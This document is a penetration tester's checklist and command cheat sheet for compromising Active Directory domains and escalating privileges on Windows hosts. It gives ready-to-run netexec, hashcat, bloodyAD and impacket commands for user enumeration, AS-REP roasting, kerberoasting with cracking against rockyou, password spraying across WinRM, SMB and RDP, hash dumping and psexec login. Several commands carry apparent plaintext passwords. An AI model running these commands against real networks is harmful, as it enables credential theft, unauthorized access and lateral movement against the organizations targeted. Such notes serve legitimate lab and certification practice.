## Active Directory

- [x] Scan all TCP ports.
- [x] Check ldap, rpc, smb with anonymous access. Check for public share.
- [x] Find usernames: If you get access, look for usernames with stuff like netexec --rid-brute, --users, and enumdomuser with rpcclient to get list of users in domain without needing initial credentials. Check usernames with kerbrute.
- [x] Test for asreproasting after you have collected usernames. If successful, try cracking.
- [x] Check for kerberoasting after you have a username and password.
- [ ] Try authenticating with every possible protocol with those set of credentials. winrm, rdp, mssql, smb, rpc, ldap etc.
- [ ] Enumerate shares for every user you get access to. Every new user means you should recheck their shares.
- [ ] If you get shell as a user, check for privesc, and dump all hashes and collect them in a file for possible bruteforcing and lateral movement.
- [ ] Run BloodHound and check for attack paths, roasting, and dcsync.
- [ ] Check for Certificate based attacks with certipy
- [ ] Check if writeable share could be a path to steal hashes with responder
- [ ] If it's an AD network, check for additional network adapters in case of pivoting being needed. If so, set up a pivot and relay all tools over that "jumpbox" so you can target the other machines in the other network.
- [ ] Remember to bruteforce different protocols with credentials you have. Remember to use NTLM authentication too.
- [ ] For post exploitation dump all hashes using [Remote Hashdump & Bruteforce Hashes]()
- [ ] Check UDP ports.
- [ ] Rescan if you're stuck, verify tools are working properly and you're running them properly.

## Windows Privesc

- [ ] Run whoami /all, then PowerUp, then WinPEAS
- [ ] This will give you all info tbh. Save output and slowly go over it.
- [ ] Check listening ports too in case you need to port forward.
- [ ] If you get completely stuck, you can manually check for things too like creds, also try more privesc tools. If that doesn't help you likely need to relearn the privesc attacks, and consider if privesc is even needed.

## Commands
### Enumerations
- Host scan
```shell
 nxc smb 192.168.1.0/24 
```
- Ports scan
```bash
nmap -p- -Pn -iL ips -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn -iL ips -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn -iL ips -v --script vuln -oN nmap_vuln.txt
```
- BloodHound 
```
netexec ldap 192.168.1.8 -u jbailey -p Paulio*3 --bloodhound --collection All --dns-server 192.168.1.8
```

- Check writable 
```
bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
```
- Users
```bash
netexec ldap 192.168.1.8 -u jbailey -p Paulio*3 --users  
```

```bash
netexec ldap 192.168.1.8 -u jbailey -p Paulio*3 --users | fgrep -v '[' | fgrep -vi '-Username-' | awk '{print$5}' | tee users
```
- Analyze the BloodHound results
- AS-Rep Roast
```bash
nxc ldap 192.168.1.8 -u adiaz -p Peru123. --asreproast asreproast.hash
```

```bash
#without authentication, with user list
netexec ldap 192.168.1.8 -u users -p "" -k --dns-server 192.168.1.8
```

```bash
hashcat -m 18200 asreproast.hash /Users/hcn/seclists/Passwords/Leaked-Databases/rockyou.txt -r /Users/hcn/Downloads/hashcat/rules/best66.rule
```
- Kerberoasting
```bash
nxc ldap 192.168.1.8 -u adiaz -p Peru123. --kerberoasting kerberoast.hash
```

```bash
hashcat -m 13100 kerberoast.hash /Users/hcn/seclists/Passwords/Leaked-Databases/rockyou.txt -r /Users/hcn/Downloads/hashcat/rules/best66.rule
```
### Password spraying
- Test all protocol
```bash
 nxc winrm ips -u users -p pass  --continue-on-success
```

```bash
 nxc smb ips -u users -p pass  --continue-on-success
```

```bash
 nxc rdp ips -u users -p pass  --continue-on-success
```

```bash
 nxc winrm ips -u users -p pass  --continue-on-success
```

```bash
 nxc smb ips -u users -p pass  --continue-on-success
```

```bash
 nxc rdp ips -u users -p pass  --continue-on-success
```

- <span style="color:red">Test all other opened protocols</span>
- Filter
```
| fgrep [+]
```
- Check writable
```
bloodyAD --host $dc -d $domain -u $username -p $password get writable --detail
```
## Tools for enum

```
 ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```
- Other tools **ldapsearch**, **rpcclient**, **bloodyAD**, **Rubeus**, **kerbrute**
- bloodyAD [cheat sheet](https://adminions.ca/books/active-directory-enumeration-and-exploitation/page/bloodyad)

- Example impacket command
```bash
impacket-psexec  administrator:Susantha25@192.168.243.30
```
